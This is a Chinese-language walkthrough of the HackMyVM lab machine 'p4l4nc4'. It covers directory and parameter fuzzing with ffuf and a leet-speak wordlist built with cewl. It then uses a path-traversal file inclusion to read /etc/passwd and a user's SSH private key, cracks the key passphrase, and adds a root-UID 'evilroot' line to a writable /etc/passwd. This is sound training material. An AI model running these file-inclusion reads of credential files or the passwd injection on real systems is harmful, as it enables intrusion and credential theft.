---
{"dg-publish":true,"dg-path":"安全/靶机/hackmyvm_p4l4nc4.md","permalink":"/安全/靶机/hackmyvm_p4l4nc4/","title":"hackmyvm_p4l4nc4"}
---

# 主机发现

![Pasted image 20250127212614.png](/img/user/picture/Pasted%20image%2020250127212614.png)



# web渗透

目录扫描：
![Pasted image 20250127213912.png](/img/user/picture/Pasted%20image%2020250127213912.png)


主页就是apache的初始页面
![Pasted image 20250127213943.png](/img/user/picture/Pasted%20image%2020250127213943.png)


但这个`/robots.txt`页面很奇怪
![Pasted image 20250127214028.png](/img/user/picture/Pasted%20image%2020250127214028.png)
乍一看是乱码
但是将他简单转码之后：
```shell
curl -s http://192.168.124.9/robots.txt | iconv -f utf-8 -t latin1
```

```txt
A palanca-negra-gigante é uma subespécie de palanca-negra. De todas as subespécies, esta destaca-se pelo grande tamanho, sendo um dos ungulados africanos mais raros. Esta subespécie é endémica de Angola, apenas existindo em dois locais, o Parque Nacional de Cangandala e a Reserva Natural Integral de Luando. Em 2002, após a Guerra Civil Angolana, pouco se conhecia sobre a sobrevivência de múltiplas espécies em Angola e, de facto, receava-se que a Palanca Negra Gigante tivesse desaparecido. Em janeiro de 2004, um grupo do Centro de Estudos e Investigação Científica da Universidade Católica de Angola, liderado pelo Dr. Pedro vaz Pinto, obteve as primeiras evidências fotográficas do único rebanho que restava no Parque Nacional de Cangandala, ao sul de Malanje, confirmando-se assim a persistência da população após um duro período de guerra. Atualmente, a Palanca Negra Gigante é considerada como o símbolo nacional de Angola, sendo motivo de orgulho para o povo angolano. Como prova disso, a seleção de futebol angolana é denominada de palancas-negras e a companhia aérea angolana, TAAG, tem este antílope como símbolo. Palanca é também o nome de uma das subdivisões da cidade de Luanda, capital de Angola. Na mitologia africana, assim como outros antílopes, eles simbolizam vivacidade, velocidade, beleza e nitidez visual
```

是一段看不懂的语言
经翻译：
![Pasted image 20250127214148.png](/img/user/picture/Pasted%20image%2020250127214148.png)

~~说实话我到这里就卡住了，不知道之后该怎么办了~~
~~看了大佬的解答，才发现是通过这个文件去生成一个字典文件然后再去进行目录扫描。。。~~
~~很神奇，不知道这个思路是怎么来的，感觉就是纯纯出题人脑洞~~
~~就借助这个靶场练习一下一些基础工具的使用吧~~

## ffuf模糊测试

[[blog/安全/工具/ffuf\|ffuf]]

先简单扫一下：
```shell
ffuf -u http://192.168.124.9/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt    -e .php,.html,.txt,.zip,.js -c -v
```
其实这一步和目录扫描没什么区别
![Pasted image 20250128164234.png](/img/user/picture/Pasted%20image%2020250128164234.png)
也能扫出来`robots.txt`

现在有用信息就是这文件，所以考虑一下怎么利用这个文件
可以利用这个文件去生成一个字典
[[blog/安全/工具/cewl\|cewl]]
```shell
cewl http://192.168.124.9/robots.txt  -w wordlist1
```

现在还需要将字典文件做一个修改，那就是进行1337(leet)格式转化
https://en.wikipedia.org/wiki/Leet
其实这个提示就在靶场的名称上(p4l4nc4)
![Pasted image 20250128165128.png](/img/user/picture/Pasted%20image%2020250128165128.png)


```leet_converter.sh
#!/bin/bash

# leet_converter.sh - 将文本按Leet Speak规则转换
# 用法: ./leet_converter.sh <输入文件> <输出文件>

# 检查参数
if [ $# -ne 2 ]; then
    echo "错误：需要两个参数"
    echo "用法: $0 <输入文件> <输出文件>"
    exit 1
fi

input_file="$1"
output_file="$2"

# 检查输入文件是否存在
if [ ! -f "$input_file" ]; then
    echo "错误：输入文件 $input_file 不存在"
    exit 1
fi

# 定义替换规则（可自定义修改）
# 格式：'s/原字符/替换字符/gi' 
# g=全局替换，i=忽略大小写
leet_rules=(
    's/a/4/gi'      # A → 4
    's/e/3/gi'      # E → 3
    's/i/1/gi'      # I → 1
    's/o/0/gi'      # O → 0
    's/s/5/gi'      # S → 5
    's/t/7/gi'      # T → 7
    's/g/6/gi'      # G → 6
    's/z/2/gi'      # Z → 2
    's/b/8/gi'      # B → 8
)

# 执行转换并保存结果
sed -f <(
    for rule in "${leet_rules[@]}"; do
        echo "$rule"
    done
) "$input_file" > "$output_file"

echo "转换完成！结果已保存到 $output_file"
```

但是经过这个脚本转化后依旧扫不出来隐藏目录，我看了看大佬题解，发现字母`g`不需要变化。。。
![Pasted image 20250128170657.png](/img/user/picture/Pasted%20image%2020250128170657.png)
说实话这我就不是很懂了

所以我们冲着字典多样性的方向再去修改一下脚本
```python
#!/usr/bin/env python3
import itertools
import sys

# 定义Leet替换规则（可扩展为多个选项）
LEET_MAP = {
    'a': ['4'],
    'e': ['3'],
    'i': ['1'],
    'l': ['1'],
    'o': ['0'],
    's': ['5'],
    't': ['7'],
    'g': ['6'],
    'z': ['2'],
    'b': ['8'],
    # 可添加更多规则，例如'l': ['1', '7']
}

def generate_variants(word):
    # 为每个字符生成可能的选项
    char_options = []
    for c in word.lower():  # 统一处理为小写，如需保留大小写需调整
        if c in LEET_MAP:
            # 原始字符 + 所有替换选项
            options = [c] + LEET_MAP[c]
        else:
            options = [c]
        char_options.append(options)
    
    # 生成所有组合
    return [''.join(combo) for combo in itertools.product(*char_options)]

def process_file(input_path, output_path):
    seen = set()
    with open(input_path, 'r') as f_in, open(output_path, 'w') as f_out:
        for line in f_in:
            original = line.strip()
            if not original:
                continue
            
            # 生成所有可能的组合
            for variant in generate_variants(original):
                if variant not in seen:
                    seen.add(variant)
                    f_out.write(variant + '\n')

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print(f"用法: {sys.argv[0]} <输入文件> <输出文件>")
        sys.exit(1)
    
    process_file(sys.argv[1], sys.argv[2])
    print(f"字典生成完成！结果保存在 {sys.argv[2]}")
```

![Pasted image 20250128171027.png](/img/user/picture/Pasted%20image%2020250128171027.png)
现在就扫出来了那个隐藏目录

![Pasted image 20250128171443.png](/img/user/picture/Pasted%20image%2020250128171443.png)
文件也扫出来了

```txt
http://192.168.124.9/n3gr4/m414nj3.php
```


再进行参数的模糊测试
```shell
ffuf -u http://192.168.124.9/n3gr4/m414nj3.php\?FUZZ\=FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -v -fc 500
```
![Pasted image 20250128171848.png](/img/user/picture/Pasted%20image%2020250128171848.png)
这个文件从参数`page`可以推测可能存在文件包含，试一下
```shell
curl http://192.168.124.9/n3gr4/m414nj3.php\?page\=../../../../../../../etc/passwd
```
![Pasted image 20250128172119.png](/img/user/picture/Pasted%20image%2020250128172119.png)

现在知道有一个用户
```txt
p4l4nc4
```

```shell
 curl http://192.168.124.9/n3gr4/m414nj3.php\?page\=../../../../../../../home/p4l4nc4/.ssh/id_rsa > rsa
```


![Pasted image 20250128185240.png](/img/user/picture/Pasted%20image%2020250128185240.png)

得到密码
```txt
friendster
```

# 提权

用脚本扫一下
https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
![Pasted image 20250128193339.png](/img/user/picture/Pasted%20image%2020250128193339.png)
发现`/etc/passwd`文件可写

其实在他的历史里面就给了提示
```shell
cat /home/p4l4nc4/.bash_history
```

![Pasted image 20250128193542.png](/img/user/picture/Pasted%20image%2020250128193542.png)

那么我们可以增加一个特权用户
首先构造一个密码
```shell
> openssl passwd -1 -salt abc 1
$1$abc$mxBQevJT9zt/6fNQJ52EC1
```


```txt
evilroot:$1$abc$mxBQevJT9zt/6fNQJ52EC1:0:0::/root:/bin/bash
```

![Pasted image 20250128195311.png](/img/user/picture/Pasted%20image%2020250128195311.png)

其实经测试，只要把p4l4nc4用户suid和guid改掉也可以
![Pasted image 20250128195708.png](/img/user/picture/Pasted%20image%2020250128195708.png)

也可以将root密码删掉，也就是去掉那个`x`
![Pasted image 20250128195807.png](/img/user/picture/Pasted%20image%2020250128195807.png)











